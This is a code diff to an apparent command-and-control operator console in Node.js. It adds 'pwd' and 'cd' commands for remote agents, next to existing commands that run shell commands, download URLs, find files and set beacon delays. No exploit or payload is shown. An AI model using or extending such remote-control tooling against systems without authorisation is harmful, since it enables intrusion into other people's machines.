@@ -31,6 +31,8 @@ function error(info) {
 function printUsage() {
   console.log('Usage: agent list\n' +
               '       agent <ID> cmd <command>\n' +
+              '       agent <ID> pwd\n' +
+              '       agent <ID> cd <dir>\n' +
               '       agent <ID> kill\n' +
               '       agent <ID> find <name> <location>\n' +
               '       agent <ID> delay <seconds>\n' +
@@ -63,7 +65,7 @@ rl.on('line', line => {
         switch (agentCmd) {
           case 'cmd': {
             const command = args.slice(2);
-            if (id == undefined || cmd.length == 0) {
+            if (cmd.length == 0) {
               console.log('Usage: agent <ID> cmd <command>');
             } else if (id in agents) {
               sendCommand(id, command.join(' '));
@@ -73,10 +75,29 @@ rl.on('line', line => {
             break;
           }
 
-          case 'kill': {
-            if (id == undefined) {
-              console.log('Usage: agent <ID> kill');
+          case 'pwd': {
+            if (id in agents) {
+              pwd(id);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
+          }
+
+          case 'cd': {
+            const dir = args[2];
+            if (dir == undefined) {
+              console.log('Usage: agent <ID> cd <dir>');
             } else if (id in agents) {
+              cd(id, dir);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
+          }
+
+          case 'kill': {
+            if (id in agents) {
               kill(id);
             } else {
               error('An agent with that ID does not exist');
@@ -86,7 +107,7 @@ rl.on('line', line => {
 
           case 'find': {
             const [name, location] = args.slice(2);
-            if (id == undefined || name == undefined || location == undefined) {
+            if (name == undefined || location == undefined) {
               console.log('Usage: agent <ID> find <name> <location>');
             } else if (id in agents) {
               find(id, name, location);
@@ -98,8 +119,8 @@ rl.on('line', line => {
 
           case 'delay': {
             const seconds = args[2];
-            if (id == undefined || seconds == undefined) {
-              console.log('Usage: agent <ID> <delay>');
+            if (seconds == undefined) {
+              console.log('Usage: agent <ID> delay <seconds>');
             } else if (id in agents) {
               setTime(id, parseInt(seconds, 10));
             } else {
@@ -110,7 +131,7 @@ rl.on('line', line => {
 
           case 'download': {
             const [url, location] = args.slice(2);
-            if (id == undefined || url == undefined) {
+            if (url == undefined) {
               console.log('Usage: agent <ID> download <url> <location>');
             } else if (id in agents) {
               download(id, url, location);
@@ -148,6 +169,15 @@ function listAgents() {
 function sendCommand(id, command) {
   console.log(`Executing ${command} on agent ${id}`);
   agents[id].queueCommand({ type: 'cmd', data: command });
+}
+
+function pwd(id) {
+  agents[id].queueCommand({ type: 'pwd' });
+}
+
+function cd(id, dir) {
+  console.log(`Changing directory to ${dir} on agent ${id}`);
+  agents[id].queueCommand({ type: 'cd', data: dir });
 }
 
 function kill(id) {
